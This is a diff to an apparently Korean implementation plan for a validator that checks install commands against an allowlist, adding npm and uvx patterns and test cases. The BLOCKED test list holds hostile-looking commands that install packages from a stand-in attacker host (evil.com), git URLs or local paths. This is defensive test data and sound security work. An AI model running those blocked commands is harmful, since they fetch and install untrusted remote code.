@@ -948,6 +948,11 @@ ALLOWED = [
     "claude mcp add -e KEY=x fetch -- uvx mcp-server-fetch",
     "npx -y create-foo@1.2.3",
     "npx -y @scope/pkg@latest --port 3000",
+    "uvx --from mcp-server-git mcp-server-git",
+    "uvx black==24.1.0",
+    "uvx ruff@0.6.0 check",
+    "npm install create-foo@1.2.3",
+    "npm install -g @scope/pkg@latest",
 ]
 
 BLOCKED = [
@@ -970,6 +975,24 @@ BLOCKED = [
     "npx -y /abs/pkg",
     "npx 'a",
     "pip install 'crewai[tools]",
+    "uvx github:evil/pkg",
+    "uvx evil/pkg",
+    "uvx https://evil.com/x.whl",
+    "uvx git+https://github.com/evil/pkg",
+    "uvx ./local-pkg",
+    "uvx /abs/pkg",
+    "uvx ../pkg",
+    "uvx --from https://evil.com/x.whl t",
+    "uvx --from git+https://github.com/evil/pkg t",
+    "uvx --from ./local t",
+    "claude mcp add x -- uvx --from https://evil.com/x.whl t",
+    "npm install -g evil/pkg",
+    "npm install github:evil/pkg",
+    "npm install https://evil.com/x.tgz",
+    "npm install git+https://github.com/evil/pkg",
+    "npm install ./local",
+    "npm install /abs/pkg",
+    "npm install ../pkg",
 ]
 
 
@@ -1021,7 +1044,7 @@ Expected: FAIL (`ModuleNotFoundError`)
 
 - [ ] **Step 3: 구현**
 
-`collector/install_cmd.py` (허용 패턴 전체 일치만 통과. 문자 집합에 `; & | $ ` < >`가 없으므로 셸 연결·치환·리다이렉트가 막힌다. `claude mcp add`는 `--` 뒤에 npx/uvx만, npx 패키지는 일반 npm 이름만(`github:`·URL·경로 거부), 따옴표는 짝이 맞아야 한다):
+`collector/install_cmd.py` (허용 패턴 전체 일치만 통과. 문자 집합에 `; & | $ ` < >`가 없으므로 셸 연결·치환·리다이렉트가 막힌다. `claude mcp add`는 `--` 뒤에 npx/uvx만, npx·npm install 패키지는 일반 npm 이름만, uvx(`--from` 포함)는 PyPI 이름만(`github:`·`owner/repo`·URL·경로 거부), 따옴표는 짝이 맞아야 한다):
 ```python
 import re
 
@@ -1029,7 +1052,8 @@ _TOKEN = r"[\w.@/:=,\[\]-]+"
 _ARG = rf"(?:{_TOKEN}|'{_TOKEN}')"  # 따옴표는 짝이 맞을 때만
 _PKG = r"(?:@\w[\w.-]*/)?\w[\w.-]*(?:@[\w.-]+)?"  # npm 패키지명만. github:, URL, 경로 거부
 _NPX = rf"npx(?: -y)? {_PKG}(?: {_ARG})*"
-_UVX = rf"uvx {_ARG}(?: {_ARG})*"
+_PYPKG = r"\w[\w.-]*(?:\[[\w,-]+\])?(?:(?:==|@)[\w.-]+)?"  # PyPI 이름(버전 지정 포함)만. URL, 경로 거부
+_UVX = rf"uvx(?: --from {_PYPKG})? {_PYPKG}(?: {_ARG})*"
 _MCP_OPT = r"(?:-s|--scope|-e|--env|-t|--transport) [\w.=:/-]+"
 PATTERNS = [re.compile(p) for p in (
     r"/plugin marketplace add [\w.-]+/[\w.-]+",
@@ -1038,7 +1062,7 @@ PATTERNS = [re.compile(p) for p in (
     _NPX,
     _UVX,
     r"pip install (?:[\w.\[\],=-]+|'[\w.\[\],=-]+')",
-    r"npm install( -g)? [\w.@/-]+",
+    rf"npm install(?: -g)? {_PKG}",
     r"git clone https://github\.com/[\w.-]+/[\w.-]+",
 )]
 
@@ -1070,7 +1094,7 @@ def score(stars: int, weekly_delta: int | None, days_since_push: float) -> float
 - [ ] **Step 4: 통과 확인**
 
 Run: `cd collector && uv run pytest tests/test_install_cmd.py tests/test_scoring.py -v`
-Expected: 37 passed
+Expected: 60 passed
 
 - [ ] **Step 5: Commit**
 
